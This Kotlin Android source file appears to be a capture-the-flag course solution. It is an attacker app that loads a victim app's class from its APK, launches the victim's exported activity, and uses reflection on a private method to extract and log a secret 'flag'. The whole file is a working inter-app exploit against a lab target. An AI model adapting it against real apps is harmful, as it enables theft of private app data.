package com.example.maliciousapp

import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.PackageManager.ApplicationInfoFlags
import android.os.Bundle
import android.util.Log

import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity

import dalvik.system.DexFile
import dalvik.system.PathClassLoader

import java.io.Serializable

class MainActivity : AppCompatActivity() {
    val TAG = "MOBIOTSEC"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
    }

    override fun onStart() {
        super.onStart()
        getFlag()
    }

    @Suppress("UNCHECKED_CAST")
    private fun getFlag() {
        val apk = getPackageManager()
            .getApplicationInfo(
                "com.example.victimapp",
                ApplicationInfoFlags.of(
                    PackageManager
                        .GET_META_DATA
                        .toLong()
                )
            )
            .sourceDir
        val containerClass = PathClassLoader(apk, classLoader)
            .loadClass("com.example.victimapp.FlagContainer")
            as Class<Serializable>

        val intent = Intent().apply {
            component = ComponentName(
                "com.example.victimapp",
                "com.example.victimapp.SerialActivity"
            )
        }
        val contract = ActivityResultContracts.StartActivityForResult()
        registerForActivityResult(contract) { result ->
            try {
                val container = result
                    .data
                    ?.getSerializableExtra("flag", containerClass)

                container?.let {
                    val flag = it
                        .javaClass
                        .getDeclaredMethod("getFlag")
                        .apply { setAccessible(true) }
                        .invoke(it)
                    Log.d(TAG, "The flag is $flag")
                }
            } catch (e: Exception) {
                Log.e(TAG, e.toString())
            }
        }.launch(intent)
    }
}
